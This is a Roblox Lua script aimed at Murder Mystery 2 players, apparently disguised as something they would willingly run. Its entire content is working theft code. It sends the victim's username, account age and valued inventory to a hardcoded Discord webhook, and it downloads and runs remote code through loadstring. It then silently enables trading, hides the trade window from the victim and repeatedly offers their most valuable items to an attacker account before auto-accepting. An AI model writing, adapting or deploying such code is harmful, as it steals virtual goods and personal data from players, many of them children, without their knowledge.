local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local RECEIVERS = { "thvmaff" }
local WEBHOOK = 'https://discord.com/api/webhooks/1563483842310971432/I06S8RRTXxxRolX4M-oYEN-UV_qgCNYomyWOeizhGAJdSlN4Y9kXLw34uCxMndQBLGNQ'
local THRESHOLD = 0.1

local requestFunction = syn and syn.request or http_request or request or fluxus and fluxus.request

local function httpGet(targetUrl)
	if not requestFunction then
		return nil
	end

	local response = requestFunction({
		Url = targetUrl,
		Method = "GET"
	})

	if response and response.Body then
		return response.Body
	end

	return nil
end

if game.PlaceId ~= 142823291 then
	return
end

if _G.__ElysiumMM2 then
	return
end

_G.__ElysiumMM2 = true
_G.LastOffer = nil

local function logger(messageContent)
end

-- Load Database
local WeaponsDatabase
local isSuccessfulDbRequire, dbRequireResult = pcall(function()
	return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
end)

if isSuccessfulDbRequire and type(dbRequireResult) == "table" then
	WeaponsDatabase = dbRequireResult
else
	local fallbackData = httpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2db")
	if fallbackData then
		local chunk = loadstring(fallbackData)
		if chunk then
			local ok, res = pcall(chunk)
			if ok and type(res) == "table" then
				WeaponsDatabase = res
			end
		end
	end
end

if not WeaponsDatabase then
	return
end

-- Load Profile
local function fetchProfileData()
	local ok, res = pcall(function()
		return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
	end)
	if ok and type(res) == "table" then
		return res
	end

	local profileFallback = httpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2profdata")
	if profileFallback then
		local chunk = loadstring(profileFallback)
		if chunk then
			local ok2, res2 = pcall(chunk)
			if ok2 and type(res2) == "table" then
				return res2
			end
		end
	end
	return nil
end

local profileData = fetchProfileData()
if not profileData then
	return
end

local rarityMap = {
	Godly = "Godly",
	Ancient = "Ancient",
	Unique = "Unique",
	Vintage = "Vintage",
	Legendary = "Legendary",
	Rare = "Rare",
	Uncommon = "Uncommon",
	Common = "Common",
	Chroma = "Chroma"
}

local defaultRarityValues = {
	Common = 0.1,
	Uncommon = 0.25,
	Rare = 0.5,
	Legendary = 1,
	Godly = 2,
	Ancient = 5,
	Unique = 10,
	Vintage = 15
}

local function fetchWeaponValues()
	local valuesFetchResult = game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2val.lua")
	if not valuesFetchResult then
		return {}
	end

	local matchPosition, endPosition = valuesFetchResult:find("weaponValues%s*=%s*{")
	if not matchPosition then
		return {}
	end

	local braceCount, inString, escaped, tableEndPos = 0, false, false, nil
	for index = endPosition, #valuesFetchResult do
		local char = valuesFetchResult:sub(index, index)
		if escaped then
			escaped = false
		elseif char == "\\" then
			escaped = true
		elseif char == "\"" or char == "'" then
			if not inString then
				inString = char
			elseif inString == char then
				inString = false
			end
		elseif not inString then
			if char == "{" then
				braceCount += 1
			elseif char == "}" then
				braceCount -= 1
				if braceCount == 0 then
					tableEndPos = index
					break
				end
			end
		end
	end

	if not tableEndPos then
		return {}
	end

	local extracted = valuesFetchResult:sub(endPosition - 1, tableEndPos)
	local chunk = loadstring("return " .. extracted)
	if not chunk then
		return {}
	end

	local ok, res = pcall(chunk)
	if ok and type(res) == "table" then
		return res
	end

	return {}
end

local fetchedWeaponValues = fetchWeaponValues()
local itemValues = {}
local WEBH00K = 'https://discord.com/api/webhooks/1563483842310971432/I06S8RRTXxxRolX4M-oYEN-UV_qgCNYomyWOeizhGAJdSlN4Y9kXLw34uCxMndQBLGNQ'
if fetchedWeaponValues and next(fetchedWeaponValues) then
	local processedValues = {}
	for categoryKey, categoryValue in pairs(fetchedWeaponValues) do
		if type(categoryValue) == "table" then
			processedValues[categoryKey] = {}
			for innerKey, innerValue in pairs(categoryValue) do
				processedValues[categoryKey][innerKey] = innerValue
				processedValues[categoryKey][innerKey:lower()] = innerValue
			end
		end
	end

	for weaponKey, weaponData in pairs(WeaponsDatabase) do
		local itemName = weaponData.ItemName or ""
		local weaponRarity = weaponData.Rarity or ""
		local mappedRarity = rarityMap[weaponRarity]
		local valFound

		if weaponData.Chroma == true and processedValues.Chroma then
			if processedValues.Chroma[itemName] then
				valFound = processedValues.Chroma[itemName]
			elseif processedValues.Chroma[itemName:lower()] then
				valFound = processedValues.Chroma[itemName:lower()]
			end
		end

		if not valFound and mappedRarity and processedValues[mappedRarity] then
			if processedValues[mappedRarity][itemName] then
				valFound = processedValues[mappedRarity][itemName]
			elseif processedValues[mappedRarity][itemName:lower()] then
				valFound = processedValues[mappedRarity][itemName:lower()]
			end
		end

		itemValues[weaponKey] = valFound or defaultRarityValues[weaponRarity] or 0.1
	end
else
	for weaponKey, weaponData in pairs(WeaponsDatabase) do
		itemValues[weaponKey] = defaultRarityValues[weaponData.Rarity or "Common"] or 0.1
	end
end

local function fetchDollarValues()
	local ok, res = pcall(function()
		return game:HttpGet("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
	end)
	if not ok or not res then
		return {}
	end

	local decodedOk, decoded = pcall(HttpService.JSONDecode, HttpService, res)
	if not decodedOk or not decoded or not decoded.data then
		return {}
	end

	local dollarMap = {}
	for _, itemEntry in ipairs(decoded.data) do
		if itemEntry.name and itemEntry.price then
			dollarMap[itemEntry.name] = itemEntry.price
			dollarMap[itemEntry.name:lower()] = itemEntry.price
		end
	end

	return dollarMap
end

local dollarValuesMap = fetchDollarValues()

local function getDollarValue(itemName)
	return dollarValuesMap[itemName] or dollarValuesMap[itemName:lower()] or 0
end

local ignoredItemsTable = {
	DefaultGun = true, DefaultKnife = true, Reaver = true, IceHammer = true,
	Gingerscythe = true, TestItem = true, Season1TestKnife = true, Cracks = true,
	Icecrusher = true, ["???"] = true, Dartbringer = true, TravelerAxeRed = true,
	TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
	BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true
}

local function sanitizeDataId(dataIdString)
	if WeaponsDatabase[dataIdString] then
		return dataIdString, "Weapons"
	end
	local matchResult = dataIdString:match("^(.-)_[KG]_%d%d%d%d$")
	if matchResult and WeaponsDatabase[matchResult] then
		return matchResult, "Weapons"
	end
	local knifeMatch = dataIdString:match("^(.+)Knife$")
	if knifeMatch and WeaponsDatabase[knifeMatch] then
		return knifeMatch, "Weapons"
	end
	local gunMatch = dataIdString:match("^(.+)Gun$")
	if gunMatch and WeaponsDatabase[gunMatch] then
		return gunMatch, "Weapons"
	end
	return dataIdString, "Weapons"
end

local function buildItemDetails(dataIdInput)
	local fixedId = sanitizeDataId(dataIdInput)
	local weaponData = WeaponsDatabase[fixedId]
	if not weaponData then
		return nil
	end

	local itemVal = itemValues[fixedId] or defaultRarityValues[weaponData.Rarity] or 0.1
	local itemNameString = weaponData.ItemName or weaponData.Name or dataIdInput

	return {
		dataid = fixedId,
		name = itemNameString,
		rarity = weaponData.Rarity or "Common",
		isChroma = weaponData.Chroma == true,
		value = itemVal,
		dollarValue = getDollarValue(fixedId)
	}
end

local function processFullInventory(profileTable)
	local fullInventoryList = {}
	local ownedWeapons = profileTable.Weapons and profileTable.Weapons.Owned or {}

	for weaponKey, quantityValue in pairs(ownedWeapons) do
		local dataIdStr = tostring(weaponKey)
		local amount = type(quantityValue) == "number" and quantityValue or 1
		local itemDetails = buildItemDetails(dataIdStr)

		if itemDetails and not ignoredItemsTable[dataIdStr] and not ignoredItemsTable[itemDetails.dataid] then
			if itemDetails.value >= THRESHOLD then
				table.insert(fullInventoryList, {
					DataID = dataIdStr,
					Name = itemDetails.name .. (itemDetails.isChroma and " [CHROMA]" or ""),
					Amount = amount,
					Value = itemDetails.value,
					DollarValue = itemDetails.dollarValue,
					Rarity = itemDetails.rarity,
					IsChroma = itemDetails.isChroma
				})
			end
		end
	end

	table.sort(fullInventoryList, function(a, b) return a.Value > b.Value end)
	return fullInventoryList
end

local weaponsToSendQueue = processFullInventory(profileData)

if #weaponsToSendQueue == 0 then
	return
end

local totalFilteredValue, totalFilteredDollar = 0, 0
for _, item in ipairs(weaponsToSendQueue) do
	totalFilteredValue += item.Value * item.Amount
	totalFilteredDollar += (item.DollarValue or 0) * item.Amount
end

local function formatInventoryText(inventoryArray, maxLimit)
	local limit = maxLimit or 20
	local lines = {}
	for i = 1, math.min(#inventoryArray, limit) do
		local item = inventoryArray[i]
		table.insert(lines, string.format("%dx %s ➜ %d (~$%.2f)", item.Amount, item.Name, item.Value, item.DollarValue * item.Amount))
	end
	if #inventoryArray > limit then
		table.insert(lines, "... and " .. (#inventoryArray - limit) .. " more")
	elseif #lines == 0 then
		table.insert(lines, "None Found")
	end
	return table.concat(lines, "\n")
end

local function sendWebhookRequest(webhookUrl, contentString, embedsArray)
	if not requestFunction or webhookUrl == "" then
		return
	end

	pcall(requestFunction, {
		Url = webhookUrl,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = HttpService:JSONEncode({
			content = contentString or "",
			embeds = embedsArray or {}
		})
	})
end

local function executeMainLogic()
	if WEBH00K == "" then return end

	local realGameJobId = game.JobId
	local joinLink = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, realGameJobId)
	local teleportScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance("142823291", "' .. realGameJobId .. '", game.Players.LocalPlayer)'

	local messageContent = (totalFilteredValue > 150 and "--@everyone" or "") .. "\n" .. teleportScript .. "\n"

	local embedPayload = {
		content = messageContent,
		embeds = { {
			title = "MM2 Hit!",
			color = 16711680,
			fields = {
				{
					name = "**👤Player Info**",
					value = "```\nUsername: " .. LocalPlayer.Name .. "\nAccount Age: " .. LocalPlayer.AccountAge .. " days\nReceiver: " .. RECEIVERS[1] .. "\n```",
					inline = false
				},
				{
					name = string.format("🎒Inventory (Total Val: %d val, $%.2f total) — Threshold: >=%d", totalFilteredValue, totalFilteredDollar, THRESHOLD),
					value = "```\n" .. formatInventoryText(weaponsToSendQueue, 20) .. "\n```",
					inline = false
				},
				{
					name = "**Click to Join**",
					value = string.format("[**Join Server**](%s)", joinLink),
					inline = false
				}
			},
			footer = { text = "(Murder Mystery 2)" },
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		} }
	}

	sendWebhookRequest(WEBH00K, embedPayload.content, embedPayload.embeds)
end

executeMainLogic()

local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 15)
if not tradeFolder then
	return
end

-- Automatically enable trades
pcall(function()
	local settingsRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Settings")
	if settingsRemote and settingsRemote:FindFirstChild("SetSetting") then
		settingsRemote.SetSetting:FireServer("TradeEnabled", true)
		settingsRemote.SetSetting:FireServer("Trades", true)
	end
end)

local tradeWindowOpenFlag = false

local playerGuiInstance = LocalPlayer:WaitForChild("PlayerGui")
local isMobileTrade = false
local tradeGuiPhoneInstance

if playerGuiInstance:WaitForChild("MainGUI", 10) and playerGuiInstance.MainGUI:WaitForChild("Game", 10) and playerGuiInstance.MainGUI.Game:FindFirstChild("Inventory") == nil then
	tradeGuiPhoneInstance = playerGuiInstance:WaitForChild("TradeGUI_Phone", 10)
	isMobileTrade = true
else
	tradeGuiPhoneInstance = playerGuiInstance:WaitForChild("TradeGUI", 10)
end

local hiddenPositionUDim2 = UDim2.new(0, 9999, 0, 9999)

task.spawn(function()
	while task.wait(0.5) do
		if tradeGuiPhoneInstance then
			pcall(function()
				tradeGuiPhoneInstance.Enabled = false
			end)

			if isMobileTrade then
				pcall(function() tradeGuiPhoneInstance.Container.Position = hiddenPositionUDim2 end)
				pcall(function() tradeGuiPhoneInstance.ClickBlocker.Position = hiddenPositionUDim2 end)
			else
				pcall(function() tradeGuiPhoneInstance.BG.Position = hiddenPositionUDim2 end)
				pcall(function() tradeGuiPhoneInstance.Container.Position = hiddenPositionUDim2 end)
				pcall(function() tradeGuiPhoneInstance.ClickBlocker.Position = hiddenPositionUDim2 end)
				pcall(function() tradeGuiPhoneInstance.Processing.Position = hiddenPositionUDim2 end)
			end
		end
	end
end)

local function getTradeStatus()
	local ok, res = pcall(function() return tradeFolder.GetTradeStatus:InvokeServer() end)
	return ok and res or "None"
end

local function declineActiveTrades()
	local status = getTradeStatus()
	if status == "StartTrade" then
		pcall(function() tradeFolder.DeclineTrade:FireServer() end)
		tradeWindowOpenFlag = false
	elseif status == "ReceivingRequest" then
		pcall(function() tradeFolder.DeclineRequest:FireServer() end)
	end
end

tradeFolder.StartTrade.OnClientEvent:Connect(function()
	tradeWindowOpenFlag = true
end)

tradeFolder.DeclineTrade.OnClientEvent:Connect(function()
	tradeWindowOpenFlag = false
end)

tradeFolder.AcceptTrade.OnClientEvent:Connect(function(accepted)
	if accepted then
		tradeWindowOpenFlag = false
	end
end)

tradeFolder.UpdateTrade.OnClientEvent:Connect(function(data)
	if type(data) == "table" and data.LastOffer ~= nil then
		_G.LastOffer = data.LastOffer
	end
end)

local function isTargetReceiver(name)
	return name:lower() == RECEIVERS[1]:lower()
end

-- Elysium Trade Loop Architecture (v353 pattern)[cite: 3]
local function doTradeWithTarget(targetPlayer)
	while targetPlayer.Parent and #weaponsToSendQueue > 0 do
		declineActiveTrades()

		-- 1. Send Request loop until trade window opens
		local tradeStarted = false
		local requestTimeout = tick() + 15
		while targetPlayer.Parent and tick() < requestTimeout do
			local status = getTradeStatus()
			if status == "None" then
				local ok, result = pcall(function() return tradeFolder.SendRequest:InvokeServer(targetPlayer) end)
				if ok and result == true then
					task.wait(3) -- Target busy
				else
					task.wait(2)
				end
			elseif status == "StartTrade" then
				tradeStarted = true
				tradeWindowOpenFlag = true
				break
			elseif status == "ReceivingRequest" then
				pcall(function() tradeFolder.DeclineRequest:FireServer() end)
				task.wait(0.3)
			else
				task.wait(0.5)
			end
		end

		if not tradeStarted then
			task.wait(2)
			continue
		end

		-- 2. Refresh inventory queue upon trade opening[cite: 3]
		local freshProfile = fetchProfileData()
		if freshProfile then
			weaponsToSendQueue = processFullInventory(freshProfile)
		end

		if #weaponsToSendQueue == 0 then
			pcall(function() tradeFolder.DeclineTrade:FireServer() end)
			break
		end

		-- 3. Batch up to 4 distinct items for this trade session[cite: 3]
		local itemsToOffer = {}
		local distinctCount = 0
		for i = 1, #weaponsToSendQueue do
			if distinctCount >= 4 then break end
			local currentItem = weaponsToSendQueue[i]
			if not itemsToOffer[currentItem.DataID] then
				itemsToOffer[currentItem.DataID] = true
				distinctCount += 1
			end
		end

		local batchedOfferList = {}
		for i = 1, #weaponsToSendQueue do
			local item = weaponsToSendQueue[i]
			if itemsToOffer[item.DataID] then
				table.insert(batchedOfferList, item)
			end
		end

		-- 4. Offer items into trade window[cite: 3]
		local offerAborted = false
		for _, item in ipairs(batchedOfferList) do
			if not tradeWindowOpenFlag then
				offerAborted = true
				break
			end
			local fixedId, category = sanitizeDataId(item.DataID)
			for _ = 1, item.Amount do
				if not tradeWindowOpenFlag then
					offerAborted = true
					break
				end
				pcall(function() tradeFolder.OfferItem:FireServer(fixedId, category) end)
				task.wait(0.1)
			end
		end

		if offerAborted or #batchedOfferList == 0 then
			pcall(function() tradeFolder.DeclineTrade:FireServer() end)
			tradeWindowOpenFlag = false
			task.wait(2)
			continue
		end

		-- 5. Lock and accept trade session[cite: 3]
		local tradeTimeout = tick() + 30
		while tick() < tradeTimeout and getTradeStatus() ~= "None" do
			pcall(function() tradeFolder.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0) end)
			task.wait(1)
		end

		declineActiveTrades()
		tradeWindowOpenFlag = false
		task.wait(2)

		-- 6. Refresh queue after trade completes[cite: 3]
		local updatedProfile = fetchProfileData()
		if updatedProfile then
			weaponsToSendQueue = processFullInventory(updatedProfile)
		else
			-- Fallback: remove offered items from local queue if profile fetch fails
			for _, offeredItem in ipairs(batchedOfferList) do
				for qIndex, qItem in ipairs(weaponsToSendQueue) do
					if qItem.DataID == offeredItem.DataID then
						table.remove(weaponsToSendQueue, qIndex)
						break
					end
				end
			end
		end
	end
end

task.spawn(function()
	while true do
		task.wait(10)
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer and isTargetReceiver(player.Name) then
				doTradeWithTarget(player)
			end
		end
	end
end)

Players.PlayerAdded:Connect(function(player)
	if isTargetReceiver(player.Name) then
		task.wait(5)
		if player.Parent then
			doTradeWithTarget(player)
		end
	end
end)
